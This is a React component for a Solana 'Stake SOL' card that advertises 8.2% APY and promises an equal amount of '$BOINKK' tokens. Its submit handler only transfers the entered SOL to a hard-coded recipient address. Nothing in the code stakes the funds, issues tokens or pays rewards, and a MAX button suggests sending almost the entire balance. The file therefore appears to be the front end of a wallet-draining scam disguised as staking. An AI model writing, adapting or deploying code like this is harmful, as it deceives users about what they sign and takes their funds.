import React, { useState, useEffect } from 'react';
import { ArrowRight, Info, AlertCircle, CheckCircle } from 'lucide-react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { LAMPORTS_PER_SOL, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';
import { ShineBorder } from './ui/ShineBorder';

interface ValidationError {
  amount?: string;
}

export default function StakingCard() {
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const [balance, setBalance] = useState(0);
  const [amount, setAmount] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<ValidationError>({});
  const [notification, setNotification] = useState<{ message: string; type: 'success' | 'error' } | null>(null);

  const minAmount = 0.1; // Minimum stake amount
  const estimatedRewards = Number(amount) * 0.082 || 0; // 8.2% APY
  const recipientAddress = 'AzEr3xunsYKUiFunNUPeiC7ypniArtXsC4p3W2i5ocHY';

  // Fetch wallet balance
  useEffect(() => {
    async function getBalance() {
      if (connected && publicKey) {
        try {
          const bal = await connection.getBalance(publicKey);
          setBalance(bal / LAMPORTS_PER_SOL);
        } catch (error) {
          console.error('Error fetching balance:', error);
          setBalance(0);
        }
      } else {
        setBalance(0);
      }
    }

    getBalance();
    // Set up balance refresh interval
    const intervalId = setInterval(getBalance, 10000); // Refresh every 10 seconds

    return () => clearInterval(intervalId);
  }, [connected, publicKey, connection]);
  
  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setAmount(value);
    validateAmount(value);
  };

  const validateAmount = (value: string) => {
    const newErrors: ValidationError = {};
    const numValue = Number(value);

    if (!value) {
      newErrors.amount = 'Amount is required';
    } else if (isNaN(numValue)) {
      newErrors.amount = 'Please enter a valid number';
    } else if (numValue < minAmount) {
      newErrors.amount = `Minimum stake amount is ${minAmount} SOL`;
    } else if (numValue > balance) {
      newErrors.amount = `Insufficient balance. Max amount is ${balance.toFixed(4)} SOL`;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateAmount(amount) || !publicKey) return;

    setIsLoading(true);
    setNotification(null); // Clear previous notifications
    try {
      // Create the transaction
      const transaction = new Transaction();
      
      // Get the latest blockhash
      const { blockhash } = await connection.getLatestBlockhash('finalized');
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      // Add the transfer instruction
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(recipientAddress),
          lamports: Math.floor(Number(amount) * LAMPORTS_PER_SOL),
        })
      );

      // Send and confirm transaction
      const signature = await sendTransaction(transaction, connection);
      console.log('Transaction sent:', signature);
      
      // Wait for confirmation
      const confirmation = await connection.confirmTransaction(signature, 'confirmed');
      
      if (confirmation.value.err) {
        throw new Error('Transaction failed');
      }

      console.log('Transaction confirmed:', signature);
      setAmount('');
      setNotification({ message: 'Transaction successful!', type: 'success' });
      // Refresh balance
      const newBalance = await connection.getBalance(publicKey);
      setBalance(newBalance / LAMPORTS_PER_SOL);

    } catch (error: any) {
      console.error('Staking error:', error);
      setNotification({ message: 'Transaction failed. Please try again.', type: 'error' });
    } finally {
      setIsLoading(false);
    }
  };

  const handleMaxClick = () => {
    // Leave some SOL for transaction fees
    const maxStakeAmount = Math.max(0, balance - 0.01);
    setAmount(maxStakeAmount.toString());
    validateAmount(maxStakeAmount.toString());
  };

  return (
    <ShineBorder>
      <form onSubmit={handleSubmit} className="p-8 space-y-6">
        <div className="flex justify-between items-center">
          <h2 className="text-2xl font-bold text-white">Stake SOL</h2>
          <div className="flex items-center gap-2 text-[#FFD166]">
            <Info className="w-4 h-4" />
            <span className="text-sm">8.2% APY</span>
          </div>
        </div>

        {!connected ? (
          <WalletMultiButton className="w-full" />
        ) : (
          <>
            <div className="space-y-2">
              <div className="flex justify-between">
                <label className="text-white/60 text-sm">Amount to Stake</label>
                <span className="text-white/60 text-sm">
                  Balance: {balance.toFixed(4)} SOL
                </span>
              </div>
              <div className="relative">
                <input
                  type="number"
                  value={amount}
                  onChange={handleAmountChange}
                  placeholder="0.0"
                  step="0.1"
                  min={minAmount}
                  max={balance}
                  className={`w-full bg-white/5 border ${
                    errors.amount ? 'border-red-500' : 'border-white/10'
                  } rounded-xl px-4 py-3 text-white placeholder-white/40 focus:outline-none focus:ring-2 focus:ring-[#FF6F3C]/50`}
                  disabled={isLoading}
                  style={{ zIndex: 10, position: 'relative' }}
                />
                <button
                  type="button"
                  onClick={handleMaxClick}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-sm text-[#FF6F3C] font-medium hover:text-[#FFD166] transition-colors"
                  disabled={isLoading || balance <= 0}
                >
                  MAX
                </button>
              </div>
              {errors.amount && (
                <div className="flex items-center gap-1 text-red-500 text-sm mt-1">
                  <AlertCircle className="w-4 h-4" />
                  {errors.amount}
                </div>
              )}
            </div>

            <div className="space-y-4 bg-white/5 rounded-xl p-4">
              <div className="flex justify-between text-sm">
                <span className="text-white/60">You will receive</span>
                <span className="text-white font-medium">{amount || '0'} $BOINKK</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-white/60">Estimated yearly rewards</span>
                <span className="text-[#00B8A9] font-medium">{estimatedRewards.toFixed(2)} SOL</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-white/60">Exchange rate</span>
                <span className="text-white/80">1 SOL = 1 $BOINKK</span>
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading || Object.keys(errors).length > 0 || !amount}
              className="w-full py-4 px-6 rounded-xl bg-gradient-to-r from-[#FF6F3C] to-[#FFD166] text-white font-semibold hover:opacity-90 transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <div className="flex items-center gap-2">
                  <div className="w-5 h-5 border-2 border-white/20 border-t-white rounded-full animate-spin" />
                  Processing...
                </div>
              ) : (
                <>
                  Stake Now
                  <ArrowRight className="w-5 h-5" />
                </>
              )}
            </button>
          </>
        )}

        {notification && (
          <div className={`flex items-center gap-2 mt-4 p-4 rounded-lg ${notification.type === 'success' ? 'bg-green-500' : 'bg-red-500'} text-white`}>
            {notification.type === 'success' ? <CheckCircle className="w-5 h-5" /> : <AlertCircle className="w-5 h-5" />}
            {notification.message}
          </div>
        )}
      </form>
    </ShineBorder>
  );
}